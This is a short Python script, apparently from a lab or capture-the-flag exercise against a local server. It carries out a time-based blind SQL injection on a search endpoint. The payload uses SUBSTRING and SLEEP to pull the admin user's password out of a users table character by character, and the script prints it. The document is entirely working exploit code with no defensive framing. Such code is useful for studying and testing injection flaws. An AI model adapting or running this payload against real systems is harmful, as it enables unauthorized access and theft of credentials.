import requests
import string
import time
import urllib.parse

CHARSET = string.ascii_letters + string.digits

password = ""
counter = 1
password_len = 10

while (len(password) != password_len):
    for char in CHARSET:
        sleeptime = 3

        payload = urllib.parse.quote_plus(f"'OR IF(substring((SELECT password from users WHERE BINARY username = 'admin'),{counter},1) = BINARY '{char}',SLEEP({sleeptime}),1);-- -")

        URL = f"http://127.0.0.1:5002/search?name={payload}" 

        t1 = time.time()

        r = requests.head(URL)

        t2 = time.time() 
        
        diff = t2 - t1
        
        if (diff >= sleeptime):
            print(f'Diff found {t2} ---- {t1} on {char}')
            counter += 1
            password += char
            print(f"[*] Found char {password}")

        else:
            continue

print(f"[*] Found admin password: {password}")           